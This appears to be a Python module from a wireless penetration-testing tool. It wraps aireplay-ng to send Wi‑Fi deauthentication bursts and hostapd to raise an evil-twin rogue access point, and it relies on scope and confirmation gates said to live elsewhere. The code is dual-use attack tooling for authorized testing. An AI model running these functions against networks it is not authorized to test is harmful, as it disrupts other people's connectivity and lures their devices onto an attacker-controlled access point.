"""The transmit boundary — the ONLY place in Ares that radiates.

Deliberately isolated from the passive :mod:`ares.monitor` so the code that emits
frames is one small, auditable surface. Every caller (``ares.cli`` via
``ares.active``) has already passed the scope + confirmation gates before
reaching here; these functions do not re-check scope, they only run the tool.

Nothing here runs unless the active tier is enabled, the target is own-scope, and
the operator confirmed — see :mod:`ares.active`.
"""

from __future__ import annotations

import subprocess
import tempfile
from pathlib import Path


class RadiateError(RuntimeError):
    """A transmit operation failed at the hardware boundary."""


def _run(cmd: list[str], *, timeout: float | None = None) -> subprocess.CompletedProcess[str]:
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=True)
    except FileNotFoundError as e:
        raise RadiateError(f"tool not found: {cmd[0]} (is this the toolbox image?)") from e
    except subprocess.CalledProcessError as e:
        raise RadiateError(f"{cmd[0]} failed: {e.stderr.strip() or e}") from e
    except subprocess.TimeoutExpired as e:
        raise RadiateError(f"{cmd[0]} timed out after {timeout}s") from e


def deauth(interface: str, bssid: str, count: int, client_mac: str | None = None) -> None:
    """Send ``count`` deauth bursts at ``bssid`` (optionally one client) with
    aireplay-ng. A bounded resilience probe — count, not a sustained flood."""
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client_mac is not None:
        cmd += ["-c", client_mac]
    cmd.append(interface)
    _run(cmd, timeout=60)


def evil_twin(interface: str, ssid: str, channel: int) -> None:
    """Stand up a rogue AP broadcasting ``ssid`` on ``channel`` via hostapd.

    Blocks while the AP runs; the caller bounds it. This is the lure — it beacons
    to everything in range, which is why its gate (``ares.active``) is the
    strictest in the tool.
    """
    conf = "\n".join(
        [
            f"interface={interface}",
            "driver=nl80211",
            f"ssid={ssid}",
            "hw_mode=g",
            f"channel={channel}",
        ]
    )
    with tempfile.TemporaryDirectory(prefix="ares-et-") as tmp:
        path = Path(tmp) / "hostapd.conf"
        path.write_text(conf)
        _run(["hostapd", str(path)], timeout=60)
